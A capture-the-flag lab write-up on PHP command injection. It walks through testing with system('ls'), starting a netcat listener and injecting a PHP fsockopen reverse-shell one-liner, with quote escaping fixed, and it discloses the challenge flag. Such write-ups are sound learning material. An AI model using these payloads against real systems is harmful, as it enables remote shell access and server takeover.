# LEKIR - Remote Code Execution (RCE) 

![Security Banner](https://img.shields.io/badge/Security-Research-blue) 
![Educational](https://img.shields.io/badge/Purpose-Educational-green)

- Write-Up Author: whoami \[[whoami]([firdauskhairuddin](https://github.com/firdauskhairuddin))\]
- Flag: firdausmemanghensem

A repository documenting my learning journey about Remote Code Execution vulnerabilities, particularly in PHP environments.

## 📌 Overview

Remote Code Execution (RCE) is a critical security vulnerability that allows attackers to execute arbitrary commands on a target server. This repository contains my notes, payloads, and mitigation strategies learned while studying RCE vulnerabilities.

## 🔥 Key Concepts

### What is RCE?
- Allows attackers to execute commands on a remote system
- Often achieved through injection vulnerabilities
- Can lead to complete system compromise
- Commonly rated as Critical severity (CVSS 9.0+)

### Common Attack Vectors:
- Unsanitized user input passed to execution functions
- Insecure file upload handling
- Dangerous deserialization
- Server-side template injection

## 💻 Dangerous PHP Functions

These PHP functions can lead to RCE if used improperly with user input:

| Function       | Risk Level | Description |
|----------------|------------|-------------|
| `exec()`       | High       | Executes external program |
| `system()`     | High       | Executes command and displays output |
| `passthru()`   | High       | Executes command and displays raw output |
| `shell_exec()` | High       | Executes command via shell |
| Backticks (`` ` ``) | High | Same as shell_exec() |
| `popen()`      | Medium     | Opens process file pointer |
| `proc_open()`  | Medium     | Advanced process control |

## 🛠️ WriteUp
![Screenshot 2025-04-11 125153](https://github.com/user-attachments/assets/025d756b-5b10-4325-94e7-2fbb603b1cda)

## Challenge Description:

>this is challenge description
It's a vulnerability that allows an attacker to execute arbitrary code on a target system remotely. Attackers exploit this vulnerability by injecting malicious code into an application or system, often through input fields or file uploads. Once exploited, RCE can lead to complete compromise of the target system, allowing attackers to steal data, install malware, or take control of the system. To prevent RCE vulnerabilities, applications should sanitize user input, validate file uploads, and implement proper security controls to restrict code execution.

# Investigate Vulnerability
* Test for Vulnerability. To test if the page is vulnerable, try injecting a simple command such as ; ls or && whoami. If the command is executed and the result is displayed (like listing the directory contents or showing the current user), then the application is vulnerable to OS command injection.

* Try PHP Function to Executes command and displays output

```c
system('ls')
```
![Screenshot 2025-04-11 123905](https://github.com/user-attachments/assets/c0c43056-a40d-44d6-b607-b5a2de780777)

its shows all the file and folder in the Database.

# Find The Docker IP Address

__Purpose :__

* Identifying the Docker container's IP address is crucial because it allows you to direct the backdoor connection back to your machine.

__Command :__

In a new terminal, run the following command `ip a`

![Screenshot 2025-04-11 131547](https://github.com/user-attachments/assets/9416bfc1-f07d-4bb3-acbc-a535749813d3)

Choose Docker0

![Screenshot 2025-04-11 154814](https://github.com/user-attachments/assets/ff187377-a098-40a4-8a91-93e861c44be6)

__Explanation :__

* his command displays all network interfaces and their associated IP addresses. Look for the `docker0` interface, which typically represents the Docker bridge network. The IP address associated with this interface is what you’ll use to direct the reverse shell.

## Set Up a Netcat Listener

**Purpose:**  
The Netcat listener will wait for an incoming connection from the target system, which will be initiated by the backdoor script.

**Command:**  
Set up a listener on a specific port (e.g., 4444) using the following command:

`nc -lvnp 3333`

![Screenshot 2025-04-11 155534](https://github.com/user-attachments/assets/f6c5c717-9095-4407-8b3a-f0aa6f656137)

**Explanation**

* The `-l` flag tells Netcat to listen for incoming connections, `-v` makes it verbose (to display the connection details), `-n` prevents DNS lookups, and `-p` specifies the port number to listen on. Once the backdoor script is executed on the target system, it will connect back to your machine on this port, giving you shell access.

## Execute The Reverse Shell

* Example command to inject from  Reverse Shell Cheat Sheet (https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#php)
  
`php -r '$sock=fsockopen("172.18.0.1",3333);system("/bin/sh -i <&3 >&3 2>&3");'`

![Screenshot 2025-04-11 160104](https://github.com/user-attachments/assets/a8fecf88-ba68-41fa-b345-2de6b6257428)

![Screenshot 2025-04-11 160127](https://github.com/user-attachments/assets/ac5431dd-ec57-4083-88e3-a77f92547deb)

nothing happend because we need to modified the payload

* Before

`system('php -r '$sock=fsockopen("172.17.0.1",3333);system("/bin/sh -i <&3 >&3 2>&3");'')`

* After

`system('php -r \'$sock=fsockopen("172.17.0.1",3333);system("/bin/sh -i <&3 >&3 2>&3");\' ')`

**Changes Made:**

1. Added Backslash Escaping (`\'`):
   
   * Before: Single quotes were mismatched and would break the command
   * After: Properly escaped inner single quotes with backslashes
   
2. Fixed Quote Nesting:

   * Before: Had unbalanced quotes causing syntax errors
   * After: Clear hierarchy of quotes (outer `'` for PHP, inner `\'` for the -r argument)

* Inject new payload

## Gain Shell Access

* Once the payload is successfully injected and executed, you should see a connection on your Netcat listener. This connection gives you shell access to the target system, allowing you to execute commands as if you were directly logged into the server.

![image](https://github.com/user-attachments/assets/158b384c-bbc2-4be5-b26b-fdb10dcb3f13)

![image](https://github.com/user-attachments/assets/03bda416-12b2-4522-b954-a6715891f6a8)

![image](https://github.com/user-attachments/assets/efc1c590-40b5-4f73-a811-fa261d7ff3b3)


## 🔐 Conclusion: Key Takeaways from This RCE Lab

1. **RCE is Extremely Dangerous**  
   - Allows attackers to execute any command on your server  
   - Can lead to full system compromise  

2. **Common Causes**  
   - Unsafe functions like `eval()`, `system()` with user input  
   - Lack of input validation/sanitization  
   - Improper error handling exposing system details  











